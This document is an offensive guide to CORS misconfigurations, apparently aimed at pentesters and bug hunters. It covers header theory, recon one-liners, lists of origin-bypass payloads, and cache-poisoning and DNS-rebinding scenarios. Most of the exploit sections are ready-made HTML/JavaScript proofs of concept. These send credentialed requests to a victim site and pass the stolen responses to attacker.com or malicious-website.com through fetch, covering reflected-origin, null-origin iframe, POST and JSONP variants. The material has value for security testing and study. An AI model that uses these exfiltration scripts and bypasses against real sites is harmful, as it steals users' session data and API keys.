# The Ultimate CORS Misconfiguration Guide

## Overview & Theory

Cross-Origin Resource Sharing (CORS) is a browser mechanism that enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the Same-Origin Policy (SOP). The SOP is a restrictive security measure that prevents a web page from making requests to a different domain than the one that served the page. An origin is defined by the triple: (scheme, host, port).

CORS works by adding new HTTP headers that let a server describe which origins are permitted to read information from a web browser. When a web application makes a cross-origin HTTP request, the browser adds an `Origin` header. The server can then respond with `Access-Control-*` headers to grant or deny the request.

For requests that can cause side-effects (e.g., `PUT`, `DELETE`, or `POST` with certain `Content-Type`s), the browser first sends a "preflight" request using the `OPTIONS` method. This preflight request checks if the actual request is safe to send.

Misconfigurations in CORS policies are common and can lead to severe vulnerabilities, primarily allowing unauthorized domains to read sensitive data from a victim's session.

### Key HTTP Headers

**Request Headers:**

*   `Origin: <origin>`: Indicates the origin of the cross-site request. Always sent.
*   `Access-Control-Request-Method: <method>`: Used in preflight requests to specify the HTTP method of the actual request.
*   `Access-Control-Request-Headers: <field-name>`: Used in preflight requests to specify the HTTP headers of the actual request.

**Response Headers:**

*   `Access-Control-Allow-Origin: <origin> | *`: Specifies which origin is allowed. A wildcard `*` allows any origin but cannot be used with credentials.
*   `Access-Control-Allow-Credentials: true`: Indicates that the response can be exposed when the request's credentials flag is true (e.g., cookies, authorization headers are sent).
*   `Access-Control-Allow-Methods: <method>[, <method>]*`: Specifies the allowed methods for a resource in response to a preflight request.
*   `Access-Control-Allow-Headers: <header-name>[, <header-name>]*`: Indicates which HTTP headers can be used when making the actual request.
*   `Access-Control-Expose-Headers: <header-name>[, <header-name>]*`: Whitelists headers that browsers are allowed to access.
*   `Access-Control-Max-Age: <delta-seconds>`: Indicates how long the results of a preflight request can be cached.

---

## Exploitation Methods & Misconfigurations

The core of most CORS attacks relies on the server incorrectly validating the `Origin` header and responding with `Access-Control-Allow-Origin: <attacker-controlled-origin>` along with `Access-Control-Allow-Credentials: true`.

### Methodology & Initial Checks

**Manual Testing:**

1.  **Identify Sensitive Endpoints**: Find API endpoints that return user-specific sensitive data (e.g., `/api/me`, `/accountDetails`).
2.  **Add Origin Header**: Send a request to the endpoint in Burp Repeater and add an `Origin` header pointing to a domain you control (e.g., `Origin: https://attacker.com`).
3.  **Analyze Response**:
    *   Check if the `Access-Control-Allow-Origin` header is present in the response and reflects your supplied origin.
    *   Check if `Access-Control-Allow-Credentials: true` is also present. If both are true, the endpoint is likely vulnerable.
4.  **Test for Bypasses**: If the origin is not reflected, try various bypass techniques listed in the "Bypasses" section below. Test for `null` origin, regex flaws, etc.

**Automated Discovery:**

1.  **Gather Targets**: Collect all subdomains for your target.
    ```bash
    subfinder -d target.com -o domains.txt
    ```
2.  **Find Live Hosts**: Filter for live web servers.
    ```bash
    cat domains.txt | httpx -silent | tee -a alive.txt
    ```
3.  **Basic Check**: Send a test `Origin` header to all live hosts. This one-liner checks if the domain itself is reflected.
    ```bash
    cat alive.txt | while read domain; do httpx -H "Origin: https://$domain" -sr -silent; done
    ```
4.  **Use Specialized Tools**: Run dedicated CORS scanners against the list of live hosts.
    *   **CORScanner**: `python3 cors_scan.py -i alive.txt -v`
    *   **Corsy**: `python3 corsy.py -i alive.txt`
    *   **CorsMe**: `cat alive.txt | ./CorsMe -t 70`

### Misconfiguration Patterns

#### 1. Server Reflects Arbitrary Origin

This is the most common and critical misconfiguration. The server blindly copies the value from the request's `Origin` header into the `Access-Control-Allow-Origin` response header.

*   **Request:**
    ```http
    GET /api/user-details HTTP/1.1
    Host: vulnerable-website.com
    Origin: https://malicious-website.com
    Cookie: sessionid=...
    ```
*   **Vulnerable Response:**
    ```http
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: https://malicious-website.com
    Access-Control-Allow-Credentials: true
    ...
    {"username": "victim", "api_key": "secret-key"}
    ```
*   **Exploitation PoC:**
    ```html
    <script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open("get", "https://vulnerable-website.com/api/user-details", true);
      req.withCredentials = true;
      req.send();

      function reqListener() {
        // Send the stolen data to the attacker's server
        fetch("https://malicious-website.com/log?data=" + encodeURIComponent(this.responseText));
      }
    </script>
    ```

#### 2. Whitelisted `null` Origin

Developers sometimes whitelist the `null` origin to support local file testing. However, an attacker can generate a request with a `null` origin using a sandboxed `iframe`.

*   **Request:**
    ```http
    GET /sensitive-victim-data HTTP/1.1
    Host: vulnerable-website.com
    Origin: null
    Cookie: sessionid=...
    ```
*   **Vulnerable Response:**
    ```http
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: null
    Access-Control-Allow-Credentials: true
    ...
    ```
*   **Exploitation PoC:**
    ```html
    <!-- Host this on attacker's server -->
    <iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
      <script>
        fetch('https://vulnerable-website.com/sensitive-victim-data', {
            credentials: 'include'
        })
        .then(response => response.text())
        .then(data => {
            fetch('//malicious-website.com/log?key=' + encodeURIComponent(data));
        });
      </script>
    "></iframe>
    ```

#### 3. Broken Whitelist/Regex Implementation

The server attempts to validate the origin against a whitelist using a flawed regular expression or string matching.

*   **Vulnerable Logic**: Checks if the origin *ends with* `trusted-website.com`.
*   **Bypass**: `Origin: https://malicious-trusted-website.com`
*   **Vulnerable Logic**: Checks if the origin *starts with* `https://trusted-website.com`.
*   **Bypass**: `Origin: https://trusted-website.com.malicious.com`

**Exploitation**: Same as arbitrary origin reflection, but use the crafted `Origin` that bypasses the filter.

#### 4. Exploiting XSS on a Trusted Subdomain

Even a correctly configured CORS policy can be bypassed if any of the whitelisted origins are vulnerable to XSS.

*   **Scenario**: `https://api.example.com` trusts `https://app.example.com`.
*   **Vulnerability**: An XSS flaw exists on `https://app.example.com`.
*   **Attack**:
    1.  The attacker finds an XSS vulnerability on `app.example.com`.
    2.  The attacker crafts a URL that exploits the XSS to run their JavaScript code on `app.example.com`.
    3.  This script, now running from a trusted origin, makes a credentialed CORS request to `https://api.example.com` to steal data.
    4.  The stolen data is then exfiltrated to the attacker's server.

*   **Example XSS Payload URL:**
    ```
    https://app.example.com/page?param=<script>/* CORS request to api.example.com and exfiltration logic here */</script>
    ```

---

## Bypasses

If a simple `Origin: https://attacker.com` doesn't work, try these bypass techniques.

### Whitelist & Parser Bypasses

Test these patterns in the `Origin` header. Assume the target whitelists `target.com`.

*   **Subdomain/Prefix/Suffix**:
    ```
    Origin: https://target.com.attacker.com
    Origin: https://attackertarget.com
    Origin: https://attacker.com/target.com
    Origin: https://subdomain.target.com.attacker.com
    ```
*   **Special Characters (Browser Dependent)**:
    *   **Safari**: `Origin: https://target.com`.attacker.com/` (backtick)
    *   **Chrome/Firefox**: `Origin: https://target.com_.attacker.com` (underscore)
    *   **Safari**: `Origin: https://target.com}.attacker.com` (curly brace)
*   **URL Parser Differentials**:
    ```
    Origin: https://foo@attacker.com:80@target.com
    Origin: https://foo@attacker.com%20@target.com
    Origin: https://attacker.com%09target.com
    ```
*   **Miscellaneous**:
    ```
    Origin: attacker.computer
    Origin: null
    ```

### Other Bypass Techniques

*   **XSSI (Cross-Site Script Inclusion) / JSONP**: If the endpoint supports a `callback` parameter, it might be vulnerable to JSONP. This bypasses CORS entirely as `<script>` tags are not subject to SOP.
    *   **Test**: `curl "https://vulnerable-api.com/data?callback=myfunc"`
    *   **Vulnerable Response**: `myfunc({"key": "value"});`
    *   **Exploitation PoC**:
        ```html
        <script>
          // This function will be called with the sensitive data
          function myfunc(data) {
            // Exfiltrate the data
            fetch("https://attacker.com/log?data=" + JSON.stringify(data));
          }
        </script>
        <!-- The script tag makes the cross-origin request -->
        <script src="https://vulnerable-api.com/data?callback=myfunc"></script>
        ```

*   **DNS Rebinding**: A complex attack where an attacker controls a domain and its DNS server.
    1.  Victim browses to `attacker.com`, which resolves to the attacker's IP. The attacker serves a malicious script.
    2.  The script starts making requests back to `attacker.com`.
    3.  The attacker changes the DNS record for `attacker.com` to an internal IP (e.g., `127.0.0.1`) with a very low TTL.
    4.  The browser's DNS cache expires. The next request to `attacker.com` resolves to the internal IP.
    5.  Since the origin is still `attacker.com`, the script can now access and exfiltrate data from internal services running on `127.0.0.1`.
    *   **Bypass Localhost Check**: Use `0.0.0.0` for Linux/Mac targets.

---

## Higher Impact Scenarios

#### 1. Server-Side Cache Poisoning

If the server reflects the `Origin` header without sanitizing characters like `\r` (CR), it can lead to HTTP Header Injection. If a caching proxy is in front of the server, the poisoned response can be served to other users.

*   **Attacker Request**:
    ```http
    GET / HTTP/1.1
    Origin: foo[0x0d]Content-Type: text/html; charset=UTF-7
    ```
*   **Server Response (seen by cache)**:
    ```http
    HTTP/1.1 200 OK
    Access-Control-Allow-Origin: foo
    Content-Type: text/html; charset=UTF-7
    ...
    ```
*   **Impact**: An attacker poisons the cache to change the `Content-Type` to `UTF-7`, which can enable Reflected XSS in browsers that support it.

#### 2. Client-Side Cache Poisoning

This attack works if a page reflects a custom header (XSS vector) and the CORS policy allows that custom header, but the server forgets to include `Vary: Origin` in the response.

1.  The attacker's page makes a CORS request to the vulnerable site, including a malicious custom header (e.g., `X-User-ID: <svg/onload=alert(1)>`).
2.  The vulnerable server allows the request, reflects the header's content in the response body, and sends it back.
3.  Because `Vary: Origin` is missing, the browser may cache this response.
4.  When the victim navigates directly to that URL, the browser serves the poisoned response from its cache, executing the XSS payload.

#### 3. Breaking TLS via HTTP Origin

If an HTTPS application (`https://secure.com`) trusts an origin served over plain HTTP (`http://trusted-subdomain.com`), an attacker in a Man-in-the-Middle (MITM) position can compromise the secure application.

1.  Victim makes any plain HTTP request.
2.  Attacker (MITM) intercepts and redirects the victim to `http://trusted-subdomain.com`.
3.  Attacker intercepts this request and serves a malicious page.
4.  This malicious page makes a CORS request to `https://secure.com`. The browser sends `Origin: http://trusted-subdomain.com`.
5.  `https://secure.com` sees the whitelisted origin and returns sensitive data.
6.  The attacker's malicious page on the HTTP origin can read this data and exfiltrate it.

#### 4. Pivoting to Internal Networks

If the victim's browser is on an internal network, a public-facing website with a CORS misconfiguration can be used as a proxy to attack internal-only applications. This is similar in impact to DNS Rebinding but can be simpler to execute. The attacker's public page makes CORS requests to internal IP addresses (e.g., `http://192.168.1.100/admin`).

---

## Automation & Tooling

*   **Scanners**:
    *   [CORScanner](https://github.com/chenjj/CORScanner)
    *   [Corsy](https://github.com/s0md3v/Corsy)
    *   [CorsMe](https://github.com/Shivangx01b/CorsMe)
    *   [theftfuzzer](https://github.com/lc/theftfuzzer)
*   **Burp Suite Extensions**:
    *   CORS*, from the BApp Store.
*   **Recon & Chaining**:
    *   `subfinder`, `assetfinder`, `findomain` for subdomain enumeration.
    *   `httpx` to find live web servers.
    *   `gf` with CORS patterns to quickly find potential endpoints from crawled URLs.
        ```json
        // Example gf pattern for CORS
        {
            "flags": "-HriE",
            "patterns":[
                "Access-Control-Allow-Origin"
            ]
        }
        ```
    *   `meg` to fetch paths across many hosts simultaneously.

---

## Proof-of-Concept (PoC) Examples

#### Basic Data Stealing (GET Request)

```html
<!-- Hosted on attacker.com -->
<!DOCTYPE html>
<html>
<body>
  <h1>CORS PoC</h1>
  <script>
    function cors() {
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          // Log response to console and send to attacker server
          console.log(this.responseText);
          fetch('https://attacker.com/log?data=' + btoa(this.responseText));
        }
      };
      // Target vulnerable endpoint
      xhttp.open("GET", "https://vulnerable-website.com/api/accountDetails", true);
      xhttp.withCredentials = true; // Send cookies
      xhttp.send();
    }
    cors(); // Execute automatically
  </script>
</body>
</html>
```

#### Data Stealing (POST Request)

```html
<!-- Hosted on attacker.com -->
<html>
<script>
  var http = new XMLHttpRequest();
  var url = 'https://vulnerable-website.com/api/sensitive-action';
  var params = 'param1=value1&param2=value2'; // POST data
  http.open('POST', url, true);

  // Set headers if needed
  http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  http.withCredentials = true;

  http.onreadystatechange = function() {
      if(http.readyState == 4 && http.status == 200) {
          alert('Response received: ' + http.responseText);
          // Exfiltrate response
          fetch('https://attacker.com/log?data=' + btoa(http.responseText));
      }
  }
  http.send(params);
</script>
</html>
```

#### JSONP Exploitation

```html
<!-- Hosted on attacker.com -->
<!DOCTYPE html>
<html>
<body>
  <h1>JSONP PoC</h1>
  <script>
    // Define the callback function that the API will call
    function handleResponse(data) {
      var responseString = JSON.stringify(data);
      console.log(responseString);
      // Exfiltrate the captured data
      fetch('https://attacker.com/log?jsonp_data=' + btoa(responseString));
    }
  </script>
  <!-- The script tag triggers the cross-domain request -->
  <script src="https://vulnerable-website.com/api/data?callback=handleResponse"></script>
</body>
</html>
```